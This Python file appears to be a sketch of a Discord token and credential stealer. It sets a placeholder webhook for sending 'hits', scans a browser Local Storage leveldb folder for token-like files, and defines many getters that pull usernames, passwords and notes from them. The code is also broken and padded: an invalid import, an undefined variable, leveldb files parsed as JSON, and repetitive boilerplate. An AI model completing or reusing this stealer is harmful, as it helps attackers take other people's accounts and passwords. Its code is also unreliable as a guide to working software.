import os
import re
import json
import discord.py

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    # find all the files in the path
    files = os.listdir(path)

    # find all the files that match the pattern
    tokens = [f for f in files if re.match(r'\w+\.\w+\.\w+', f)]

    # return the list of tokens
    return tokens


def get_token_data(token):
    # get the data from the token
    data = json.loads(open(path + '\\' + token, 'r').read())

    # return the data
    return data


def get_token_url(token):
    # get the data from the token
    data = get_token_data(token)

    # get the url from the data
    url = data['url']

    # return the url
    return url


def get_token_title(token):
    # get the data from the token
    data = get_token_data(token)

    # get the title from the data
    title = data['title']

    # return the title
    return title


def get_token_username(token):
    # get the data from the token
    data = get_token_data(token)

    # get the username from the data
    username = data['username']

    # return the username
    return username


def get_token_password(token):
    # get the data from the token
    data = get_token_data(token)

    # get the password from the data
    password = data['password']

    # return the password
    return password


def get_token_notes(token):
    # get the data from the token
    data = get_token_data(token)

    # get the notes from the data
    notes = data['notes']

    # return the notes
    return notes


def get_token_tags(token):
    # get the data from the token
    data = get_token_data(token)

    # get the tags from the data
    tags = data['tags']

    # return the tags
    return tags


def get_token_url_title(token):
    # get the url from the token
    url = get_token_url(token)

    # get the title from the token
    title = get_token_title(token)

    # return the url and title
    return url, title


def get_token_url_title_username(token):
    # get the url from the token
    url = get_token_url(token)

    # get the title from the token
    title = get_token_title(token)

    # get the username from the token
    username = get_token_username(token)

    # return the url, title, and username
    return url, title, username




